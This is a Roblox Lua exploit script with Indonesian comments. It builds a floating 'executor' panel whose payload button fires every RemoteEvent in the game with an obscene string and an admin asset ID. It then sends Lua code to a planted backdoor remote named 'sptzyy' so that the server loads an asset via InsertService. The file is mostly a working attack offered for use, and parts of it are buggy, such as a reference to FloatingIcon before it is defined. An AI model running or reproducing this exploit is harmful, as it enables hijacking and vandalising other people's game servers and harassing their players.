-- === Konfigurasi & Service ===
local GUI_NAME = "ExecutorGUI"
local ICON_ID = "rbxassetid://7335147596" 
local FLOATING_ICON_EMOJI = "🛡️"
local ICON_SIZE = UDim2.new(0, 50, 0, 50) 
local DRAG_THRESHOLD = 5 
local BUTTON_HEIGHT = 30 
local BUTTON_SPACING = 5  

-- Warna Modern/Minimalis
local COLOR_BG = Color3.fromRGB(35, 35, 35)      
local COLOR_ACCENT = Color3.fromRGB(0, 150, 255)  
local COLOR_OFF = Color3.fromRGB(50, 50, 50)     

-- Services
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local task = task

-- *** Perbaikan Kunci: Memastikan LocalPlayer dan PlayerGui siap ***
local LocalPlayer = Players.LocalPlayer or Players.LocalPlayer:Wait()
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Variabel status
local IS_GUI_VISIBLE = false
local isMainFrameDraggingFunction = function() return false end
local isIconDraggingFunction = function() return false end -- Variabel global untuk status drag ikon

-- === 1. Fungsi Notifikasi ===
local function notify(title, text, duration, iconOverride)
    pcall(StarterGui.SetCore, StarterGui, "SendNotification", {
        Title = title,
        Text = text,
        Duration = duration or 3,
        Icon = iconOverride or ICON_ID,
    })
end

-- === 7. Fungsi Drag GUI (Diperbarui) ===
local function makeDraggable(frame)
    local dragging = false
    local dragStartPos = nil
    local startFramePos = nil
    local isDragging = false 
    
    local dragArea = frame:FindFirstChild("DragHandle") or frame
    dragArea.Active = true -- Penting agar Input bisa diterima
    
    local conn1 = dragArea.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            isDragging = false 
            dragStartPos = input.Position
            startFramePos = frame.Position
            -- Memastikan Input dikonsumsi agar tidak memicu aksi lain di bawahnya
            game:GetService("UserInputService"):SetMouseIcon("rbxassetid://273775019") -- Ubah kursor saat drag dimulai
        end
    end)

    local conn2 = dragArea.InputChanged:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
            local delta = input.Position - dragStartPos
            
            if not isDragging and (delta.X * delta.X + delta.Y * delta.Y) > (DRAG_THRESHOLD * DRAG_THRESHOLD) then
                isDragging = true
            end
            
            if isDragging then
                -- Memperbarui posisi frame
                local newX = startFramePos.X.Scale + (delta.X / frame.Parent.AbsoluteSize.X)
                local newY = startFramePos.Y.Scale + (delta.Y / frame.Parent.AbsoluteSize.Y)
                
                -- Clamp posisi agar frame tidak keluar dari layar (Opsional, tapi direkomendasikan)
                newX = math.max(0, math.min(newX, 1 - frame.Size.X.Scale))
                newY = math.max(0, math.min(newY, 1 - frame.Size.Y.Scale))

                frame.Position = UDim2.new(newX, startFramePos.X.Offset + delta.X, newY, startFramePos.Y.Offset + delta.Y)
            end
        end
    end)
    
    local conn3 = dragArea.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
            game:GetService("UserInputService"):SetMouseIcon("") -- Kembalikan kursor normal
        end
    end)
    
    -- Mengembalikan fungsi yang melaporkan status dragging saat ini
    return function()
        return isDragging
    end
end

-- === 2. Pembuatan GUI utama dan sub-Frame ===
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = GUI_NAME
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
ScreenGui.Parent = PlayerGui 
ScreenGui.DisplayOrder = 999 -- *** Perbaikan Kunci: ZIndex tertinggi ***

local total_buttons = 2 
local main_frame_height = 30 + (total_buttons * BUTTON_HEIGHT) + ((total_buttons + 1) * BUTTON_SPACING) 

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 250, 0, main_frame_height) 
MainFrame.Position = UDim2.new(0.5, -125, 0.5, -(main_frame_height / 2)) 
MainFrame.BackgroundColor3 = COLOR_BG
MainFrame.BorderSizePixel = 0
MainFrame.Visible = false 
MainFrame.ZIndex = 5 -- Lebih tinggi dari Icon
MainFrame.Parent = ScreenGui

local CornerMain = Instance.new("UICorner")
CornerMain.CornerRadius = UDim.new(0, 8) 
CornerMain.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "DragHandle" 
TitleLabel.Size = UDim2.new(1, 0, 0, 30)
TitleLabel.BackgroundColor3 = COLOR_ACCENT
TitleLabel.Text = "🛠️ PANEL EKSEKUTOR"
TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TitleLabel.Font = Enum.Font.SourceSansSemibold
TitleLabel.TextSize = 18
TitleLabel.Active = true 
TitleLabel.ZIndex = 6
TitleLabel.Parent = MainFrame

local function getButtonY(index)
    return 30 + (BUTTON_SPACING * index) + (BUTTON_HEIGHT * (index - 1))
end

-- Tombol 1: Run Payload (Posisi ke-1)
local function runPayload()
    if isMainFrameDraggingFunction() then return end -- Cek drag state
    
    -- [FUNGSI PAYLOAD TIDAK BERUBAH DARI PERBAIKAN SEBELUMNYA]
    notify("🚀 Payload", "Menjalankan payload...", 3)
    
    local modelName = "sptzyy"
    local zyy = nil
    
    for _, obj in ipairs(Workspace:GetChildren()) do
        if obj.Name == modelName then
            obj:Destroy()
        end
    end

    local conn = Workspace.ChildAdded:Connect(function(child)
        if child.Name == modelName and zyy == nil and child:IsA("RemoteEvent") then
            zyy = child 
            conn:Disconnect() -- Disconnect setelah ditemukan
        end
    end)

    local payload = "KONTOL MESUM😂"

    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            pcall(remote.FireServer, remote, payload)
            RunService.RenderStepped:Wait()
        end
    end
    
    task.wait(0.5)
    
    local adminPayloads = {9880962516}
    for _, remote in ipairs(ReplicatedStorage:GetDescendants()) do
        if remote:IsA("RemoteEvent") then
            for _, payloadID in ipairs(adminPayloads) do
                pcall(remote.FireServer, remote, payloadID)
            end
            RunService.RenderStepped:Wait()
        end
    end
    
    if conn and conn.Connected then conn:Disconnect() end -- Pastikan koneksi ditutup

    if zyy and zyy:IsA("RemoteEvent") then
        local playerName = LocalPlayer.Name
        local insertPayload = [[
            local player = game.Players:FindFirstChild("]] .. playerName .. [[")
            if player and player:FindFirstChild("PlayerGui") then
                local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
                asset.Parent = player.PlayerGui
                for _, child in ipairs(asset:GetChildren()) do
                    child.Parent = player.PlayerGui
                end
                asset:Destroy()
            end
        ]]
        pcall(zyy.FireServer, zyy, insertPayload) 
        notify("sptzyy Payload", "Berhasil kirim payload ke sptzyy!", 3)
    else
        notify("sptzyy Payload", "RemoteEvent sptzyy tidak ditemukan. :(", 5)
    end
end

local PayloadButton = Instance.new("TextButton")
PayloadButton.Name = "PayloadButton"
PayloadButton.Size = UDim2.new(0.9, 0, 0, BUTTON_HEIGHT)
PayloadButton.Position = UDim2.new(0.05, 0, 0, getButtonY(1))
PayloadButton.BackgroundColor3 = COLOR_ACCENT
PayloadButton.Text = "🚀 Run Payload"
PayloadButton.ZIndex = 5
PayloadButton.Parent = MainFrame
PayloadButton.MouseButton1Click:Connect(runPayload)

-- Tombol 2: Icon toggle (Posisi ke-2)
local function toggleIcon()
    if isMainFrameDraggingFunction() then return end
    
    local currentVisible = FloatingIcon.Visible
    FloatingIcon.Visible = not currentVisible
    
    PayloadButton.BackgroundColor3 = FloatingIcon.Visible and COLOR_ACCENT or COLOR_OFF
    
    notify("🎭 Icon Toggle", "Floating Icon: " .. (FloatingIcon.Visible and "Terlihat" or "Tersembunyi"), 2)
end

local IconToggleButton = Instance.new("TextButton")
IconToggleButton.Name = "IconToggleButton"
IconToggleButton.Size = UDim2.new(0.9, 0, 0, BUTTON_HEIGHT)
IconToggleButton.Position = UDim2.new(0.05, 0, 0, getButtonY(2))
IconToggleButton.BackgroundColor3 = COLOR_OFF
IconToggleButton.Text = "🎭 TOGGLE FLOATING ICON"
IconToggleButton.ZIndex = 5
IconToggleButton.Parent = MainFrame
IconToggleButton.MouseButton1Click:Connect(toggleIcon)

-- Style semua tombol
for _, btn in ipairs(MainFrame:GetChildren()) do
    if btn:IsA("TextButton") then
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.Font = Enum.Font.SourceSansBold
        local Corner = Instance.new("UICorner")
        Corner.CornerRadius = UDim.new(0, 6)
        Corner.Parent = btn
    end
end

-- === 8. Support drag GUI
isMainFrameDraggingFunction = makeDraggable(MainFrame)

-- === 3. Icon floating dan toggle
local FloatingIcon = Instance.new("TextButton") 
FloatingIcon.Name = "FloatingIcon"
FloatingIcon.Size = ICON_SIZE
FloatingIcon.Position = UDim2.new(0.02, 0, 0.85, 0) 
FloatingIcon.BackgroundTransparency = 0 
FloatingIcon.BackgroundColor3 = COLOR_ACCENT 
FloatingIcon.Text = FLOATING_ICON_EMOJI 
FloatingIcon.Font = Enum.Font.SourceSans -- Font default, tapi emoji umumnya akan tetap muncul
FloatingIcon.TextSize = ICON_SIZE.Offset.X * 0.7 
FloatingIcon.TextColor3 = Color3.new(1, 1, 1) -- Pastikan teks/emoji berwarna putih
FloatingIcon.ZIndex = 10 -- *** Perbaikan Kunci: ZIndex Sangat Tinggi ***
FloatingIcon.Parent = ScreenGui 

local CornerIcon = Instance.new("UICorner")
CornerIcon.CornerRadius = UDim.new(0.5, 0) 
CornerIcon.Parent = FloatingIcon

isIconDraggingFunction = makeDraggable(FloatingIcon) -- Menghubungkan fungsi drag untuk ikon

FloatingIcon.MouseButton1Click:Connect(function()
    if not isIconDraggingFunction() then -- Cek apakah sedang drag
        IS_GUI_VISIBLE = not IS_GUI_VISIBLE
        MainFrame.Visible = IS_GUI_VISIBLE 
        
        -- Memindahkan MainFrame ke posisi tengah jika pertama kali dibuka, atau membiarkannya di posisi terakhir
        if IS_GUI_VISIBLE and MainFrame.Position.X.Scale == 0.5 then
             MainFrame.Position = UDim2.new(0.5, -125, 0.5, -(main_frame_height / 2)) 
        end

        notify("⚙️ GUI Status", "Panel Eksekutor: " .. (IS_GUI_VISIBLE and "Terlihat" or "Tersembunyi"), 2)
    end
end)

-- === 4. Finalisasi & Notifikasi
notify("✅ Executor Loaded", "Floating Icon " .. FLOATING_ICON_EMOJI .. " aktif. Klik untuk buka panel.", 4)
